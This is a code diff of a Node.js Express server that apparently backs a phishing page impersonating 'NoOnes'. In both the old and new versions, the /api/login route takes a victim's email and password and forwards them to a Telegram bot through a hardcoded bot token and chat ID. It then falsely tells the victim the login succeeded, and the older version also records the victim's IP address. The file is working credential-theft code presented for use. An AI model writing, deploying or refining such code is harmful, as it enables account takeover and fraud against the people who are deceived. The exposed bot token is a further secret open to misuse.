@@ -5,131 +5,60 @@ const axios = require('axios');
 const app = express();
 const PORT = process.env.PORT || 5000;
 
-// Telegram config
-const TELEGRAM_BOT_TOKEN = '8959682316:AAEFW23lt-waRnNMAIhIy4_evhz6LpwMaxA';
-const TELEGRAM_CHAT_ID = '7386607055';
-const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
-
-// ===== MIDDLEWARE =====
+// SIMPLE CORS - Allow everything (for testing)
 app.use(cors({
     origin: '*',
-    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
-    allowedHeaders: ['Content-Type', 'Authorization']
+    methods: ['GET', 'POST', 'OPTIONS'],
+    allowedHeaders: ['Content-Type']
 }));
 
 app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
-
-// ===== TELEGRAM FUNCTION =====
-async function sendToTelegram(message) {
-    try {
-        const response = await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'HTML'
-        });
-        console.log('✅ Telegram sent');
-        return response.data;
-    } catch (error) {
-        console.error('❌ Telegram error:', error.message);
-        return null;
-    }
-}
-
-// ===== FORMAT LOGIN MESSAGE =====
-function formatLoginMessage(email, password, ip) {
-    return `
-🔐 <b>New Login Attempt</b>
-═══════════════════════
-
-📧 <b>Email/Phone:</b> <code>${email}</code>
-🔑 <b>Password:</b> <code>${password}</code>
-🌐 <b>IP:</b> ${ip}
-🕐 <b>Time:</b> ${new Date().toISOString()}
-
-═══════════════════════
-🔒 NoOnes Security Alert
-    `;
-}
-
-// ===== ROUTES =====
 
 // Home route
 app.get('/', (req, res) => {
-    res.json({
-        status: 'online',
-        service: 'NoOnes Backend',
-        timestamp: new Date().toISOString(),
-        routes: ['/api/login', '/api/health']
-    });
+    res.json({ status: 'online', message: 'Server is running!' });
 });
 
-// Health check
-app.get('/api/health', (req, res) => {
-    res.json({
-        status: 'healthy',
-        timestamp: new Date().toISOString()
-    });
-});
-
-// ===== LOGIN ROUTE - THIS IS WHAT YOU NEED =====
+// Login route - SIMPLE VERSION
 app.post('/api/login', async (req, res) => {
-    console.log('📨 Login route hit!');
+    console.log('📨 Login hit!');
+    console.log('Body:', req.body);
     
     try {
         const { email, password } = req.body;
         
-        console.log('📧 Email:', email);
-        
         if (!email || !password) {
-            return res.status(400).json({
-                success: false,
-                message: 'Email and password are required'
+            return res.status(400).json({ 
+                success: false, 
+                message: 'Email and password required' 
             });
         }
 
-        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'N/A';
-        
         // Send to Telegram
-        const message = formatLoginMessage(email, password, ip);
-        await sendToTelegram(message);
+        const TELEGRAM_BOT_TOKEN = '8959682316:AAEFW23lt-waRnNMAIhIy4_evhz6LpwMaxA';
+        const TELEGRAM_CHAT_ID = '7386607055';
+        
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: `🔐 New Login\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toISOString()}`,
+            parse_mode: 'HTML'
+        });
 
-        res.json({
-            success: true,
-            message: 'Login successful!',
-            timestamp: new Date().toISOString()
+        res.json({ 
+            success: true, 
+            message: 'Login successful!' 
         });
 
     } catch (error) {
-        console.error('❌ Login error:', error);
-        res.status(500).json({
-            success: false,
-            message: 'Server error'
+        console.error('Error:', error.message);
+        res.status(500).json({ 
+            success: false, 
+            message: 'Server error' 
         });
     }
 });
 
-// 404 handler
-app.use((req, res) => {
-    console.log('❌ 404 - Route not found:', req.method, req.path);
-    res.status(404).json({
-        success: false,
-        message: 'Route not found'
-    });
-});
-
-// ===== START SERVER =====
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`
-╔═══════════════════════════════════════╗
-║    🚀 NoOnes Backend Server          ║
-║    Running on port: ${PORT}              ║
-║    Status: Online                     ║
-║    Time: ${new Date().toISOString()}    ║
-╚═══════════════════════════════════════╝
-    `);
-    console.log('📡 Available routes:');
-    console.log('   GET  /');
-    console.log('   GET  /api/health');
-    console.log('   POST /api/login  ← THIS IS THE LOGIN ROUTE');
+    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`📡 Available: POST /api/login`);
 });
